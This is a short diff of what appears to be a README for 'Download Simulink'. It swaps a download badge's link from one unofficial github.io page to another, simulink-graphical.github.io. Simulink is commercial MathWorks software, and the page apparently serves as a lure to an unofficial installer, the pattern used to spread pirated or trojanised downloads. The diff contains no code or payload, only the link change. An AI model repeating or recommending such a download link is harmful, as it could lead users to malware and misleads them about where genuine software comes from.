@@ -2,7 +2,8 @@
 
 ## 📥 Download Simulink
 
-[![⬇️ Download Simulink](https://img.shields.io/badge/Download-Simulink-blue?style=for-the-badge&logo=mathworks)](https://simulink-dynamics-download.github.io/.github)
+[![⬇️ Download Simulink](https://img.shields.io/badge/Download-Simulink-blue?style=for-the-badge&logo=mathworks)](https://simulink-graphical.github.io/.github
+)
 
 ---
 
